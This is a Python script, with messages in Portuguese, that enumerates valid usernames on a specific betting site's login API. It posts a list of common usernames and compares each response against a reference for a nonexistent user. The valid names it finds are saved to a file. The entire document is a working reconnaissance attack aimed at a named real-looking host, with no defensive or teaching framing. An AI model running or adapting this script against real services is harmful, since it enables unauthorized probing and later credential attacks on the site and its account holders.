import requests

def enumerate_users():
    url = "https://w1-panda.bet/api/login"
    common_users = ["admin", "root", "user", "test", "manager", "support", "webmaster"]
    valid_users = []
    
    print("[*] Iniciando exploração de enumeração de usuários...")
    
    # Referência para erro de usuário inexistente
    ref_payload = {"username": "nonexistent_user_xyz_123", "password": "password"}
    try:
        ref_res = requests.post(url, json=ref_payload, timeout=10).text
    except:
        print("[!] Erro ao obter referência.")
        return []

    for user in common_users:
        payload = {"username": user, "password": "password"}
        try:
            res = requests.post(url, json=payload, timeout=10).text
            if res != ref_res:
                print(f"[+] USUÁRIO VÁLIDO ENCONTRADO: {user}")
                valid_users.append(user)
        except:
            pass
            
    return valid_users

if __name__ == "__main__":
    users = enumerate_users()
    with open("valid_users.txt", "w") as f:
        for u in users:
            f.write(u + "\n")
